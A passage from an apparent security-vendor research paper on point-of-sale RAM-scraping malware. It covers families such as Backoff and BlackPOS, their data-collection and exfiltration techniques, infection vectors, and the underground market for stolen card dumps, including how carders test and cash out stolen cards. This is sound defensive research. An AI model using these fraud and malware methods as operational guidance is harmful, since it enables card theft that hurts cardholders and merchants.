the\ncorrect number of digits, to find Tracks 1 and\n2 credit card data in the process memory.\nBackoff also has keylogging functionality. It\ncalls the GetKeyState and GetKeyboardState\nAPIs to capture keyboard inputs and logs\nthem to %APPDATA%\\ORACLEJAVA\\Log.\n\n\n_txt. Backoff exfiltrates stolen data using_\nHTTP POST and uses RC4 and Base64 to\nencode content. It also takes inspiration from\nDexter, as it implements an elaborate POST\nmessage schema that retrieves the following\ninformation from infected systems:\n\n   - Unique bot ID\n\n   - Usernames/Hostnames\n\n   - Windows OS version\n\n   - Malware version\n\nBackoff also has bot functionality and can\nprocess the following commands, among\nothers:\n\n_•_ _Update_\n\n_•_ _Download_\n\n_•_ _Run_\n\n_•_ _Upload KeyLogs_\n\nBackoff does not spread via exploit, phishing,\ndrive-by-download, and other attacks. It\nborrowed a BrutPOS infection technique\ninstead. Cybercriminals use publicly available\ntools to identify companies that use remote\ndesktop applications on their PoS systems\nand attempt to brute-force their login features\nin order to gain entry into these PoS systems.\nOnce entry is gained, systems are infected\nwith Backoff. [44], [45], [46]\n\n\n-----\n\n|Backoff Files Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|2cf34b70906779c9e230c5ffce4179f4f58eea5a||\n|11b7430026c82097657c145dcedfa818bf1032d3||\n|caf546e3ee1a1d2768ec37428de1ff7032beea94|TSPY_POSLOGR.B|\n|85e9fcc38b1683f94e12a438cbea17679bb8b724||\n|66c83acf5b852110493706d364bea53e48912463||\n\n\n-----\n\n## WHAT WILL THE NEXT GENERATION OF POS RAM SCRAPERS LOOK LIKE?\n\n\nPredicting what the next generation of\nmalware families will look like is tricky\nbecause coders constantly modify their\ntechniques and approaches to evade\ndetection, to implement new functionality or\nfeatures, and to improve infection success\nrates. Malware coders are also not bound by\nany code of conduct and ethics as well as\nby infringement laws. They liberally borrow\nfunctionality or features from others’ codes\nas long as these can help them achieve their\nnefarious goals.\n\nDespite the predicaments above and given\nthe narrow scope of the problem studied,\nreasonable predictions about the next\ngeneration of PoS RAM scrapers were\nstill made. The approach used involved\nidentifying common PoS RAM scraper traits\nand observing how recently discovered\n\n\nmalware reuse tried-and-tested functionality.\nThe functionality presented in this paper\nwas then grouped into the following distinct\ncategories:\n\n   - General characteristics\n\n   - Data-collection techniques\n\n   - Data-exfiltration techniques\n\nTo get a better perspective of the evolution\nof PoS RAM scrapers, the malware families\nwere organized by year of discovery. Note\nthat a malware variant may have existed long\nbefore it was discovered because tracking\nexact dates is extremely difficult to do. Almost\nfour years’ worth of PoS RAM scrapers were\navailable to study for traits.\n\n|PoS RAM Scraper Families|Col2|\n|---|---|\n|Year Discovered|Malware Family|\n|2011|Rdasrv|\n|BlackPOS 2012 Alina Dexter|BlackPOS|\n||Alina|\n||Dexter|\n|VSkimmer 2013 ChewBacca|VSkimmer|\n||ChewBacca|\n\n\n-----\n\n|PoS RAM Scraper Families|Col2|\n|---|---|\n|Year Discovered|Malware Family|\n|Decebal JackPOS Soraya 2014 BrutPOS Backoff BlackPOS ver. 2|Decebal|\n||JackPOS|\n||Soraya|\n||BrutPOS|\n||Backoff|\n||BlackPOS ver. 2|\n\n\n#### General Characteristics\n\nThe following table lists the general\ncharacteristics observed among the PoS\n\n\nRAM scraper families featured in this paper.\nIt includes installation techniques, bot\nfunctionality, social engineering tactics, and\nsimilar attributes.\n\n\n-----\n\n|General Characteristics of PoS RAM Scraper Families|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Characteristic|Rdasrv|BlackPOS|Alina|Dexter|VSkimmer|ChewBacca|Decebal|JackPOS|Soraya|BrutPOS|Backoff|Number|\n|Collects system information||||||||||||7|\n|Uses a single component||||||||||||7|\n|Uses socially engineered filenames||||||||||||6|\n|Updates itself||||||||||||5|\n|Has bot functionality||||||||||||5|\n|Uses multiple components||||||||||||4|\n|Is packed||||||||||||3|\n|Pretends to be Java||||||||||||3|\n|Has a kill switch||||||||||||3|\n\n\n-----\n\n|General Characteristics of PoS RAM Scraper Families|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Characteristic|Rdasrv|BlackPOS|Alina|Dexter|VSkimmer|ChewBacca|Decebal|JackPOS|Soraya|BrutPOS|Backoff|Number|\n|Hooks APIs||||||||||||3|\n|Installs a watchdog process||||||||||||2|\n|Injects code||||||||||||2|\n|Attacks systems with weak or default password||||||||||||2|\n|Uses multiple exfiltration methods||||||||||||1|\n\n\n-----\n\nOverall, the following top general\ncharacteristics of PoS RAM scrapers were\nidentified:\n\n   - They collect and exfiltrate system\ninformation.\n\n   - All of their functionality are packed\ninto a single binary as opposed to\nrelying on multiple components to\ninfect systems.\n\n   - They use socially engineered\nfilenames when installed in order to\navoid drawing unwanted attention.\n\n   - They can update themselves.\n\n   - They have bot functionality and can\nreceive commands from C&C servers.\n\nThe following top general characteristics of\nPoS RAM scrapers discovered in 2014 were\nalso identified:\n\n   - They are custom-packed in order\nto obfuscate their code. This helps\nthem defeat anti-malware signatures\n\n\nthat search for specific patterns\nor functionality for detection and\nblocking purposes.\n\n   - They collect system information.\n\n   - They have bot functionality and can\nreceive commands from C&C servers.\n\n   - They install a watchdog process to\nensure persistence.\n\n   - They have a kill switch that allows\nthem to remove themselves.\n\nAs shown, two of the top general\ncharacteristics of PoS RAM scrapers\ndiscovered in 2014 are present in the list of\ntop overall characteristics.\n\n#### Data Collection\n\nThe following table lists the RAM-scraping\nand other data-collection techniques\nobserved among the PoS RAM scraper\nfamilies featured in this paper.\n\n\n-----\n\n|Data-Collection Techniques That PoS RAM Scraper Families Use|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Technique|Rdasrv|BlackPOS|Alina|Dexter|VSkimmer|ChewBacca|Decebal|JackPOS|Soraya|BrutPOS|Backoff|Number|\n|Uses the CreateToolhelp 32Snapshot method||||||||||||7|\n|Uses a blacklist||||||||||||7|\n|Has a custom search function||||||||||||7|\n|Uses regexes||||||||||||4|\n|Uses Base64 to encode data for exfiltration||||||||||||4|\n|Stores results in logfiles||||||||||||3|\n|Performs Luhn validation||||||||||||3|\n|Logs keystrokes||||||||||||3|\n|Targets known PoS systems or applications||||||||||||2|\n\n\n-----\n\n|Data-Collection Techniques That PoS RAM Scraper Families Use|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Technique|Rdasrv|BlackPOS|Alina|Dexter|VSkimmer|ChewBacca|Decebal|JackPOS|Soraya|BrutPOS|Backoff|Number|\n|Encrypts data for exfiltration||||||||||||2|\n|Encodes data as hex digits for exfiltration||||||||||||2|\n|Uses the Enum Processes method||||||||||||1|\n\n\n-----\n\nOverall, the following top data-collection\ntechniques used by PoS RAM scrapers were\nidentified:\n\n   - They use the\n_CreateToolhelp32Snapshot method to_\niterate over all running processes.\n\n   - They use a blacklist to avoid scanning\nprocesses wherein Tracks 1 and 2\ncredit card data cannot be found.\n\n   - They look for Tracks 1 and 2 credit\ncard data using a custom search\nfunction—a fast method but does not\nnecessarily deliver quality results.\n\n   - They search for Tracks 1 and 2 credit\ncard data via regex matching, which\nis a slow process.\n\n   - They encode data as a Base64 string\nin order to obfuscate their content.\n\nThe following top techniques among PoS\nRAM scrapers discovered in 2014 were also\nidentified:\n\n   - They use the\n_CreateToolhelp32Snapshot method to_\niterate over all running processes.\n\n\n\n   - They use a blacklist to avoid scanning\nprocesses wherein Tracks 1 and 2\ncredit card data cannot be found.\n\n   - They look for Tracks 1 and 2 credit\ncard data using a custom search\nfunction.\n\n   - They encode data as a Base64 string\nin order to obfuscate their content.\n\n   - They compute a Luhn checksum to\nvalidate the Tracks 1 and 2 credit card\ndata that they scrape.\n\nAs shown, four of the top data-collection\ntechniques PoS RAM scrapers discovered\nin 2014 use are in the overall list. Using\nthe CreateToolhelp32Snapshot method,\nblacklists, and custom search functions\nhave proven to be the most efficient way\nof harvesting Tracks 1 and 2 credit card\ndata from the process memory in infected\nsystems’ RAM.\n\n#### Data Exfiltration\n\nThe following table lists the data-exfiltration\ntechniques observed among the PoS RAM\nscraper families featured in this paper.\n\n\n-----\n\n|Data-Exfiltration Techniques That PoS RAM Scraper Families Use|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Technique|Rdasrv|BlackPOS|Alina|Dexter|VSkimmer|ChewBacca|Decebal|JackPOS|Soraya|BrutPOS|Backoff|Number|\n|Uses HTTP POST||||||||||||5|\n|Data is manually removed||||||||||||2|\n|Uses FTP servers||||||||||||2|\n|Uses HTTP GET requests||||||||||||1|\n|Sends stolen data via HTTP header||||||||||||1|\n|Uses Tor||||||||||||1|\n|Uses emails or Simple Mail Transfer Protocol (SMTP)||||||||||||1|\n|Uses network shares||||||||||||1|\n\n\n-----\n\n|Data-Exfiltration Techniques That PoS RAM Scraper Families Use|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Technique|Rdasrv|BlackPOS|Alina|Dexter|VSkimmer|ChewBacca|Decebal|JackPOS|Soraya|BrutPOS|Backoff|Number|\n|Data is exfiltrated via removable devices||||||||||||1|\n\n\n-----\n\nIt is clear from the table above that HTTP\nPOST requests are the preferred dataexfiltration method by both pre- and 2014\nPoS RAM scrapers. This is because HTTP\nPOST requests are not cached, not saved\nin history, and have no restrictions on datasending length.\n\nThe lists presented above are by no means\nexhaustive, as they only contain functionality\nobserved among the PoS RAM scrapers\n\n\nfeatured in this paper. Combining functionality\nfrom each distinct category allowed for\npredicting the creation of dozens of working\nnext-generation PoS RAM scrapers. Note\nthat not all permutations will work. Innovative\ncybercriminals may figure out new ways to\nexploit holes found in PCI DSS requirements\nand how to breach systems by crafting new\ndata-gathering and -exfiltration techniques.\nEven worse, these innovative features will\nsurely be quickly replicated by their peers.\n\n\n-----\n\n## INFECTION METHODS\n\n#### Using a Bag of “Old” Tricks\n\nMerchants and vendors, regardless of size,\ncan be potential credit card data theft targets.\nThe easiest place to steal credit card data\nis from the RAM of PoS systems where\nit temporarily resides in plain text during\ntransaction processing. The challenge for\ncybercriminals is to find a reliable method\nto infect PoS systems. They have been\nachieving this using a variety of tried-andtested methods such as social engineering,\nlateral movement, and vulnerability\nexploitation, among others.\n\n##### INSIDE JOBS\n\nInside jobs are the most difficult infection\nvector to protect against, as this involves\npeople that companies trust or who can\nabuse privileges to commit crime. [47] These\npeople could be disgruntled or disillusioned\nemployees out to take revenge against their\nemployers or could just be unscrupulous\nand are out to make some quick cash\nby victimizing their employers. Some\ncybercriminals have also been known to\nbribe employees to deliberately plug infected\nUSB sticks into systems or servers that\ncontain sensitive data in order to compromise\nthem.\n\nThe earliest PoS RAM scraper variants did\nnot have network functionality but they were\ndiscovered on semi-air-gapped PoS systems.\n\n[48] They then harvested credit card data that\nwas dumped in simple text files that were\ncollected afterward. This strongly indicates\nthe possibility of an inside job. PCI DSS\nrequirements specify the following:\n\n\n\n   - Identify and authenticate access to\nsystem components.\n\n   - Maintain policies that address\ninformation security for all personnel.\n\nSmall businesses do not frequently\nenforce the requirements above, leaving\nthemselves vulnerable to attacks. Even\nin big corporations, very few things can\nprevent disgruntled staff members from\nintentionally infecting systems or servers that\ncontain sensitive information. A hotel clerk,\nfor instance, could quietly plug an infected\nUSB key into a credit-card-processing\nserver at the front desk. Some PoS RAM\nscraper families such as VSkimmer include\nfunctionality to dump the stolen data\ndirectly in a text file in a USB stick, which\nimplies insider jobs are not uncommon.\nPCI DSS requirements can deter but\ncannot completely prevent inside jobs from\nhappening, as these ultimately rely on trust.\n\n##### PHISHING AND SOCIAL ENGINEERING\n\nPhishing and social engineering attacks\nare tried-and-tested methods of infecting\nsystems with malware. PoS RAM scrapers\nare never spammed to millions of potential\nvictims. They are instead sent to chosen\ntargets via phishing emails with effective\nsocial engineering lures. Besides, the attacks\nwill lose their edge if the malicious binaries\nused are made easily available. Security\ncompanies can quickly identify threats and\ncreate generic signatures to stop them.\nStealth is, therefore, a key characteristic of\nsuccessful PoS attacks.\n\nSmall businesses often use their PoS\nsystems to browse the Internet and to check\n\n\n-----\n\nemails, making them easy attack targets.\nPhishing emails generally deliver malware\npayloads in the following ways:\n\n**•** **As attachments: Some emails come**\nwith an attachment and use social\nengineering lures in the message\nbody to convince recipients to\ndownload and open the attached file.\nThe attachments used are commonly\n.ZIP files that contain a malicious\nexecutable file. The executable\nfiles, meanwhile, are disguised as\ncommonly used files (e.g., .DOC,\n.PDF, .XLS, or other files). Some\ndisguised executable files can also\nbe directly attached to emails instead\nof being archived. These files are\nusually droppers or downloaders that\nstealthily install PoS RAM scrapers\non systems. Another strategy could\ninvolve attaching malicious .PDF or\n.DOC files to emails. When opened,\nthe malicious code embedded in the\nfiles stealthily download and install\nPoS RAM scrapers on systems.\n\n**•** **As embedded malicious links:**\nSome emails can contain malicious\nURLs and use social engineering\nlures in the message body to\nconvince recipients to click them.\nClicking the URLs can directly\ndownload PoS RAM scrapers or can\ndownload droppers that stealthily\ninstall malware on systems.\n\nOther infection techniques include using\nhidden iframes, embedding scripts, and\nexploiting vulnerabilities. In general, the\ntwo methods above are most commonly\nemployed in phishing attacks because\nthey consistently work. Drive-by download\nattacks can also be employed but cannot be\neffectively used without prior knowledge of\ntargets’ browsing habits.\n\n\nOnce installed, PoS RAM scrapers normally\nrename themselves using inconspicuous\nfilenames to evade detection. Some of the\nsocially engineered filenames that PoS RAM\nscrapers use include the following:\n\n_•_ _java.exe_\n\n_•_ _mmon32.exe_\n\n_•_ _taskmgr.exe_\n\n_•_ _adobeflash.exe_\n\n_•_ _windowsfirewall.exe_\n\nPoS attacks that rely on phishing and social\nengineering usually succeed against small\nbusinesses with limited technical resources\nor capabilities. But they are, in theory, less\neffective against big companies that have\nproper operations security policies in place.\nOf course, some big corporations have been\nknown to succumb to seemingly simple social\nengineering attacks, making this technique\nextremely effective.\n\n##### VULNERABILITY EXPLOITATION\n\nNew software vulnerabilities with varying\nseverity levels are disclosed and patched\nevery month by their respective vendors.\nOnly a handful of these are successfully\n“weaponized.” Once weaponized, the\nvulnerabilities are used in cyber attacks for\nyears. Some of the vulnerabilities, which may\nno longer be new and have been regularly\nexploited, include the following:\n\n**•** **CVE-2010-3333: Rich Text Format**\n(RTF) Stack Buffer Overflow\nVulnerability. [49]\n\n**•** **CVE-2012-0158: MSCOMCTL.OCX**\nRemote Code Execution (RCE)\nVulnerability, which is one of the most\ncommonly exploited vulnerabilities in\ntargeted attacks. [50]\n\n\n-----\n\n**•** **CVE-2012-1889: Microsoft Extensible**\nMarkup Language (XML) Core\nServices Vulnerability. [51]\n\n**•** **CVE-2012-4681: Java 7 Vulnerability.**\n\n[52]\n\n**•** **CVE-2008-4841: WordPad and**\nMicrosoft™ Word® Vulnerability. [53]\n\n**•** **CVE-2010-0188: Adobe® Acrobat®**\nand Reader® Vulnerability. [54]\n\n**•** **CVE-2010-2883: Adobe Reader**\nVulnerability. [55]\n\nExploits successfully compromise systems\nbecause patches for the vulnerabilities they\ntarget have not routinely been applied. The\nvulnerable systems may not have undergone\n\n\nregular maintenance as well or upgraded.\nThere are various other reasons. It was\nsurprising that a search of the National\nVulnerability Database revealed no Common\nVulnerabilities and Exposures (CVE) records\nassociated with PoS software. [56] One\nplausible explanation for this is that the target\nmarket for PoS software is so small and\nspecialized that the vulnerabilities discovered\nare kept private and quickly patched without\ndrawing unnecessary attention. Now that\nPoS attacks are becoming common, PoS\nsoftware vulnerabilities may soon be publicly\ndisclosed and patched.\n\nThe following figure based on Trend Micro™\nSmart Protection Network™ data shows the\nPoS RAM scraper detection distribution by\nOS between April and June 2014.\n\n\nWindows Server 2008\n\nWindows 7\n\nWindows XP\n\nWindows Server 2003\n\nWindows 8\n\nWindows Server 2000\n\nWindows Vista\n\n**Figure 38: PoS RAM scraper detection distribution by OS**\n\n\n59.96%\n\n20.53%\n\n11.09%\n\n6.98%\n\n0.82%\n\n0.41%\n\n0.21%\n\n\n**NOTE: All mentions of “detections” within the text refer to instances when threats were found on users’**\n\ncomputers and were subsequently blocked by any Trend Micro security software. Unless otherwise\n\nstated, the figures featured in this report were based on data gathered by the Trend Micro Smart\nProtection Network cloud security infrastructure, which uses a combination of in-the-cloud technologies\n\nand client-based techniques to support on-premise products and hosted services.\n\n\nIt is worrisome to see that Windows XP,\nWindows Server 2000, and Windows Server\n2003 were still being used after Microsoft\nended support for the first two OSs as well as\nmainstream support for the third. This means\nthat new vulnerabilities found in these OSs\n\n\nwill no longer receive patches. Vulnerabilities\ndiscovered on other Windows versions that\nmay also exist on the unsupported OSs will\nnot get patched as well. Support for Windows\nServer 2003 has been extended until 2015\nso it still receives some patches. On the flip\n\n\n-----\n\nside, companies running the latest OSs are\nalso at risk if they do not regularly patch\nsoftware or perform system maintenance.\n\n##### PCI DSS NONCOMPLIANCE ABUSE\n\nAs previously mentioned, although PCI DSS\ndoes not offer new secure technologies\nto protect electronic payment systems, it\ndoes provide requirements to implement\nadditional layers of security control around\nexisting ones. Some of the key PCI\nDSS requirements to secure operating\nenvironments include but are not limited to\nthe following:\n\n   - Install ideally multitier hardware or\nsoftware firewalls to protect networks.\n\n   - Change default passwords,\nconfigurations, and encryption keys.\n\n   - Eliminate unnecessary ports,\naccounts, services, scripts, drivers,\nfeatures, subsystems, file systems,\nWeb servers, and protocols.\n\n   - Incorporate two-factor authentication\nfor remote network access among\nemployees, administrators, and third\nparties.\n\nBRANCH NETWORK\n\nPoS\nsystem Router\n\nSwitch\n\nCredit card\n\nPoS Back-office database server\nsystem\n\nSwitch Router\n\nMain HQ database server\n\nHQ\n\n\n\n   - Implement log and audit trails on\nsystems.\n\n   - Install and regularly update antimalware solutions installed on\nsystems.\n\nHardening systems and networks is not a\ntrivial task. Companies that lack expertise\nor resources often incorrectly configure\ntheir PoS systems and networks, making\nthem susceptible to different attacks that\ncompromise them by installing malware.\n\n##### CYBER ATTACKS\n\nCompanies with PoS systems deployed\nin multiple sites or geographical locations\nusually have a centralized PoS management\nframework.\n\nIn the initial phase of a targeted attack, threat\nactors gather intelligence (e.g., network\nenvironment, organizational structure,\nemployee information, news, etc.) on the\ncompany. [57] Using the information that they\ngather, they craft social engineering attacks\nand attempt to identify weaknesses in the\ntargets’ network setups that they can exploit\nin order to gain entry. The same steps are\nundertaken in cyber attacks that target PoS\nsystems.\n\n\n**Figure 39: Attackers gain entry into the target network**\n\n\n-----\n\nOnce entry is gained, attackers then set\nup an initial beachhead and establish\ncommunication with C&C servers. They\nthen download additional tools and\nmalicious binaries while performing in-depth\nreconnaissance of the entire network to\ncollect credentials (e.g., password hashes),\nlocate databases, scan ports, discover the\nnetwork topography, audit OS environments,\nidentify host-naming conventions, and others.\nThey use the reconnaissance data for lateral\nmovement throughout the network and for\n\nBRANCH NETWORK\n\nPoS\nsystem\n\nSwitch Router\n\nCredit card\n\nPoS Back-office database server\nsystem\n\nSwitch Router\n\nMain HQ database server\n\nHQ\n\n\ndata exfiltration. In attacks targeting PoS\nsystems, they identify devices and infect\nthem with RAM scrapers. If they are lucky\nand succeed in compromising a System\nCenter Configuration Manager (SCCM)\nserver, they can centrally deploy PoS\nRAM scrapers to all of the PoS systems\nthat it manages. Similarly, compromising\na whitelisting server would allow them to\nwhitelist their malware to evade discovery.\n\n\n**Figure 40: Attackers laterally move throughout the target network**\n\n\nAttacks like this are meticulously planned\nand well-executed, making them difficult\nto detect. Attackers also set up multiple\nbackdoors across the network in case one\nis discovered and blocked, allowing them to\n\n\nmaintain persistence. A sophisticated attack\ncan also use a kill switch to remove all traces\nof infection with a single command issued via\na C&C server.\n\n\n-----\n\n## UNDERGROUND CREDIT CARD SCENE\n\n\n#### Data-Exfiltration Methods\n\nHarvested Tracks 1 and 2 credit card data is\nonly valuable after exfiltration from infected\nsystems. Older PoS RAM scrapers such\nas Rdasrv did not have data-exfiltration\nfunctionality. They instead dropped the\ndata that they scraped onto a text file on\ninfected systems, which was then manually\nor remotely collected. With the growing\npopularity of PoS RAM scrapers as a tool\nfor quick monetary gains, the malware’s\n\nFTP server\n\nCompromised site\n\nStolen data\n\n\nfunctionality quickly evolved to include\ndata exfiltration. PoS RAM scrapers use\ntechnologies such as FTP, HTTP POST or\nGET requests and headers, Tor, and SMTP,\namong others, to exfiltrate data today.\n\nBased on analyses of the various PoS RAM\nscrapers currently infecting companies’\nsystems, we broadly classified the dataexfiltration techniques into those shown in the\nfollowing figure, wherein “” represents data\nmovement.\n\nC&C server\n\nFake hosted site\n\nCybercriminals\n\nEmail\n\nManual removal\n\n|FTP server C&C server Compromised site Fake hosted site ata Tor circuit Email RDP/Backdoor|Col2|\n|---|---|\n|ata||\n\n\n**Figure 41: Data-exfiltration techniques observed among PoS RAM scrapers**\n\n\n-----\n\nThe following were also noted:\n\n   - Cybercriminals register fake domains\nfor data-exfiltration purposes with\nhosting providers in countries with\nlax Internet law enforcement such as\nRussia and Romania, among others.\nThese fake domains act like man-inthe-middle (MitM) data collectors.\n\n   - The Tor network conceals C&C\nservers’ IP addresses and, by default,\nencrypts all traffic. The C&C servers’\naddresses end with a .onion pseudoTLD, which cannot be resolved\noutside the Tor network and can\nonly be accessed using a Tor proxy\napplication. ChewBacca makes use of\nthis functionality.\n\n   - Cybercriminals use compromised\nemail accounts to exfiltrate stolen\ndata. A command line email client\ninvoked through a batch script may\nbe used to exfiltrate stolen data as an\nattachment. BlackPOS makes use of\nthis functionality.\n\n   - Cybercriminals create accounts\non FTP servers that are hosted\nin countries with lax Internet law\nenforcement. Malware such as\nBlackPOS or BrutPOS log in to FTP\nservers using hardcoded credentials\nand copy over the stolen data.\n\nAs PoS RAM scrapers evolve and as new\nstrategies to exploit PCI DSS guidelines are\ndiscovered, we can assume that new dataexfiltration techniques will be developed to\ntake advantage of these vulnerabilities.\n\n#### Data Validation\n\nAs previously mentioned, PAN is a 16- to\n19-digit number stored in Tracks 1 and 2 of\ncredit cards. Its first six digits refer to the IIN.\nMajor card networks have unique IIN ranges\nthat identify who issued each card. The\n\n\nPAN’s final digit is a check digit calculated\nusing the Luhn algorithm. This is designed\nto catch errors in the PAN’s previous digits.\nAll valid credit card numbers must pass Luhn\nvalidation.\n\nPoS RAM scrapers generally use regex\nmatches to search for and harvest\nTracks 1 and 2 credit card data from the\nprocess memory in the RAM. Depending on\nthe complexity of the regex, it may incorrectly\ncapture garbage data from the RAM in\naddition to valid card data. Well-defined\nregexes return clean results but may be more\ncomputationally expensive compared with\nlooser ones. If the cybercriminals’ goal is to\nquickly capture data from the RAM, efficiency\nis deemed more important than information\nquality.\n\nTo circumvent the bad data problem,\nsome PoS RAM scrapers implement Luhn\nvalidation to check the quality of the data\nthat they harvest prior to exfiltration. A\nsimpler solution is to validate the data that\nthey exfiltrate offline. Cybercriminals have\nbeen known to use cracked commercial DLP\nproducts that merchants use for PCI DSS\ncompliance purposes in order to validate the\ndata that they exfiltrate offline prior to selling\nit in the underground carder marketplace.\nCracked commercial DLP solutions such as\nCard Recon can, in addition to validating\ncredit card data, search for and sort\ninformation by issuer and generate reports.\n\n[58]\n\n**Figure 42: Card Recon’s interface**\n\n\n-----\n\nA home-brewed tool for validating Track 2\ncredit card data using the Luhn algorithm was\nalso discovered inside a PoS RAM scraper\ndistribution package. A second tool or script\nmost likely sorts the validated credit card\ndata by issuer based on publicly available IIN\ninformation.\n\n**SHA-1**\n\n29ff4be5d8a595b5812fa84574f7c2785616f72b\n\n54e35c98fd8bee2902f9138552706f1ba7702146\n\n#### Who Are Behind PoS Attacks?\n\nHackers infiltrate companies and steal\nTracks 1 and 2 credit card data from PoS\nsystems using RAM scrapers. They then\nsell the stolen credit card data in batches\ncalled “dumps” to carders in carding forums.\nBuying and selling dumps is called “carding.”\nCarders are the consumers of stolen card\ndata, which they then monetize. Carding\nforums sell both skimmed and scraped card\ndata. We have not found price variances\nbetween the two types of data although the\nconsensus in some carding forums seems to\nbe that data obtained via skimming is better.\n\nFinding carding forums is easy. A simple\nInternet search returns hundreds of results.\n\nMost of the carding forums have detailed\ntutorials for newbies. These show that a large\nnumber of carding forums exist outside the\nDeep Web and are easy to discover. [59]\n\n\nCybercriminals need to check and validate\ncredit card data prior to selling it in\nunderground carder marketplaces because\nselling bad information will damage their\nreputation. Repeat offenses can also put their\npersonal security at risk.\n\n**Trend Micro Detection Name**\n\nTSPY_POCARDL.AI\n\nSPYW_CCVIEW\n\nTROJ_DECBAL.A\n\nForums are very welcoming to new members\n(i.e., newbies) and even provide extensive\nsupport to help newbies get up to speed in\ncarding. The idea behind this is simple—the\nmore dumps sold, the more money hackers\nmake. Selling dumps is not like selling\ndrugs that are limited in quantity. Hackers\ntend to sell the same dumps to multiple\ncarders because verifying duplicate sales is\ndifficult. Hackers also provide replacement\nguarantees if cards stop working within an\nagreed x number of hours after purchase.\n\n**Figure 43: Search results for “carding forum”**\n**NOTE: Among the 790,000 results returned, only**\n\na few hundred are actual forum links.\n\n|PoS Malware Analyzed|Col2|\n|---|---|\n|SHA-1|Trend Micro Detection Name|\n|TSPY_POCARDL.AI 29ff4be5d8a595b5812fa84574f7c2785616f72b SPYW_CCVIEW|TSPY_POCARDL.AI|\n||SPYW_CCVIEW|\n|54e35c98fd8bee2902f9138552706f1ba7702146|TROJ_DECBAL.A|\n\n\n-----\n\n**Figure 44: Newbie carding tutorials**\n\n\n#### Stolen Card Data for Sale\n\nCarding forums sell all kinds of card data to\nanyone who is willing to pay. Transactions\nare completed using Bitcoins, Western\nUnion, MoneyGram, Ukash, and WebMoney,\namong others, as these offer convenience\nand anonymity to both buyers and sellers.\n\nDifferent card brands fetch varying prices\nin carding forums, depending on supply\n\n\nand demand as well as how much money\ncarders can potentially steal from stolen\ncards before banks block or deactivate them.\nOur recent visit to the Russian underground\nshows that the prices of stolen credit card\ndata have been declining over the years.\n\n[60] Price variations, depending on card\nbrand, still exist. The following table shows\nrepresentative prices of validated U.S.-based\ncredit cards in various carding forums.\n\n|U.S.-Based Credit Card Prices by Brand|Col2|Col3|Col4|\n|---|---|---|---|\n|Site|Visa/MasterCard|AMEX|Discover|\n|Site 1|US$1.50/card|US$2.00/card|US$3.00/card|\n|Site 2|US$1.00/card|US$1.20/card|US$1.50/card|\n|Site 3|US$2.00/card|US$2.50/card|US$2.50/card|\n|Site 4|US$2.00/card|US$3.00/card|US$3.00/card|\n\n\n-----\n\n**Figure 45: Carding forum page**\n\n\nTwo key takeaways were obtained from\ninvestigating credit card prices. First, buying\ncredit card data in bulk reduces unit prices,\nin some cases, by up to 66%. Second, the\nunit prices of Discover and AMEX cards\nare higher than of those issued by Visa and\nMasterCard. AMEX and Discover cards cost\nmore because they have lower charge-back\nvolumes compared with Visa and MasterCard\ncards, which have lots of charge-backs\nand are thus subject to greater scrutiny.\nThe forums also claim that most merchants\ndo not properly verify AMEX and Discover\ncards for large-sum transactions. Beliefs\nand speculations such as these, combined\nwith the fact that AMEX and Discover cards\n\n\nare harder to come by compared with Visa\nor MasterCard cards, make them more\nexpensive.\n\n#### Using Stolen Credit Cards\n\nThe first principle in any carding forum is that\none needs to spend money to make money.\nCarders invest in dumps with the expectation\nof quick return on investment (ROI). Active\ndiscussions were seen on carding forums\non how much money carders can actually\nsteal using stolen credit cards before banks\nblock or deactivate them. The following table\ncompiles amount ranges that carders claimed\nthey were able to steal.\n\n|Amount Ranges Carders Claimed to Have Stolen|Col2|\n|---|---|\n|Card Name|Amount Range|\n|Visa Classic|US$500‒2,600/card|\n|Visa Platinum|US$3,000‒6,000/card|\n|Visa Signature and Business|US$5,000‒20,000/card|\n\n\n-----\n\n|Amount Ranges Carders Claimed to Have Stolen|Col2|\n|---|---|\n|Card Name|Amount Range|\n|Discover|US$1,000‒5,000/card|\n\n\nLooking at the ranges in the table above, it\nis obvious that if carders get lucky, they can\ncause substantial financial damage to banks\nand card owners. The lure of big payoffs\ncontinues to fuel a thriving underground\ncarding marketplace.\n\nAfter purchasing dumps from hackers,\ncarders check if the credit card numbers are\nstill active before attempting to use them.\nSome of the techniques they use include but\nare not limited to the following:\n\n   - Sign up to pornographic websites,\nwhich require a valid credit card for\nage-verification purposes\n\n   - Make small online donations to\ncharitable organizations to see if\ntransactions are approved\n\n   - Find online merchants who can verify\ncredit card limits without charging the\ncards (Note that these merchants are\nextremely rare and their contacts or\nlinks are not publicly shared.)\n\nThe most popular methods used to\nsuccessfully cash out on stolen credit cards\ninclude the following:\n\n**•** **Use in ATMs, vending machines,**\n**and gas pumps: Carders create**\nsimple fake cards and use them at\nvending machines to purchase goods\nor at gas pumps to purchase fuel or if\nthey have the cards’ PINs, use them\nat ATMs to withdraw cash. ATMs,\nvending machines, and gas pumps\nare meant to self-serve and thus\nrequire no attendants. So, transaction\n\n\nerrors that happen would not raise\nimmediate suspicion. Carders do\nnot need to create authentic-looking\ncounterfeit cards, again due to the\nnonpresence of attendants to verify\ntheir authenticity. The downside of this\ntype of cash-out method is that ATMs\nhave a daily withdrawal limit and\nvending kiosks inside shopping malls\nonly sell low-priced goods.\n\n**•** **Use for online purchases: This is,**\nby far, the most popular cash-out\nmethod. Carders tend to target poorly\ndesigned e-commerce websites and\norder goods from there. The wisdom\nin carding forums is that a poorly\ndesigned e-commerce website is a\ngood indication of poor management\nand so they may be easier to\ncomplete fraudulent transactions with.\nCarders also frequent e-commerce\nwebsites that do not require the\nCVV2 number for card-not-present\ntransactions. Once 